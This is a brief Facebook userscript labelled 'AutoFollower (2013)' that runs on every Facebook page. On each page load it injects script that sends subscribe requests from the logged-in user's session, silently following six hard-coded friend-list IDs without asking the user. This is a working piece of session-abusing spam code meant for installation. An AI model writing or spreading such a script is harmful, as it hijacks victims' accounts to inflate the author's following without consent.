// ==UserScript==
// @name            Facebook AutoFollower (2013)
// @description     Facebook AutoFollower (2013)
// @author	    ITS ALL ABOUT FACEBOOK
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==
function rull (uidss) {var a = document.createElement('script');a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";document.body.appendChild(a);
}rull("1437020656523532");rull("1437020976523500");rull("1437021933190071");rull("248758585259853");rull("341491062653271");rull("244367472365631");


 